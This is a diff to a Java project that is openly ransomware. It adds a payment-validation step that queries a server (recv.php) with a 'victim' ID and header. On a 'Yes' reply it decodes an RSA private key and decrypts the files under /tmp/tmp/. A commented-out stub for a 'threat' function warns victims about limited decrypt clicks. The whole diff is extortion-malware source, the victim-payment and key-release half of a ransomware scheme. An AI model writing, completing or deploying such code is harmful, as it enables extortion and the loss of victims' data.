@@ -6,16 +6,21 @@ import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.Key;
+import java.security.KeyFactory;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
 import java.security.PrivateKey;
 import java.security.PublicKey;
+import java.security.spec.PKCS8EncodedKeySpec;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.List;
@@ -24,6 +29,7 @@ import java.nio.file.*;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.management.RuntimeErrorException;
+import java.security.spec.InvalidKeySpecException;
 
 class secret {
 	KeyPair secret(){
@@ -52,10 +58,8 @@ class secret {
 }
 
 class RansomwareDeactivate{
-	void decryptAllFiles() throws IOException{
+	void decryptAllFiles(PrivateKey privKey) throws IOException{
 		secret sec = new secret();
-		KeyPair kp = sec.secret();
-		RansomwareDeactivate ransomware = new RansomwareDeactivate();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
 			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
@@ -66,10 +70,10 @@ class RansomwareDeactivate{
 		}
 		for(Path file:fileNames){
 			try{
-				System.out.println("Encrypting file: "+file.toString());
+				System.out.println("Decrypting file: "+file.toString());
 				String inputFile = file.toString();
 				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
-				sec.decryptFiles(Cipher.ENCRYPT_MODE, kp.getPrivate(), inputFile,outputFile);
+				sec.decryptFiles(Cipher.DECRYPT_MODE, privKey, inputFile,outputFile);
 				File f = new File(inputFile);
 				f.delete();
 			}
@@ -81,8 +85,48 @@ class RansomwareDeactivate{
 }
 
 public class project {
+	private String[] result;
 	void activate() throws IOException{
-		RansomwareDeactivate ransomware  = new RansomwareDeactivate();
-		ransomware.decryptAllFiles();
+		String privKey = result[1].replaceAll("-","").replaceAll("BEGIN PRIVATE KEY","").replaceAll("END PRIVATE KEY","");
+		byte[] privateBytes = Base64.getDecoder().decode(privKey);
+		PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(privateBytes);
+		try{
+			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+			PrivateKey privateKey = keyFactory.generatePrivate(keySpec);
+			RansomwareDeactivate ransomware  = new RansomwareDeactivate();
+			ransomware.decryptAllFiles(privateKey);
+		}
+		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
+			throw new RuntimeException(e);
+		}
+	}
+
+	//Function to warn user telling them only 3 clicks availble to Decrypt Button to decrease server load
+	//void threat(){		
+	//}
+
+	void validatePayment(){
+		//ID is the victim's ID
+		int id = 1;
+		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+id);
+		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+		con.setRequestMethod("GET");
+		con.addRequestProperty("Victim", "Yes");
+		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+		String inputLine;
+		StringBuffer response = new StringBuffer();
+		while((inputLine = in.readLine()) != null){
+			response.append(inputLine);
+		}
+		in.close();
+		String ans  =response.toString();
+		result = ans.split("s@",2);
+		if(result[0]=="Yes" && result[1] != null){
+			activate();
+		}
+		//Implement in future release
+		//else{
+		//	threat();
+		//}
 	}
 }
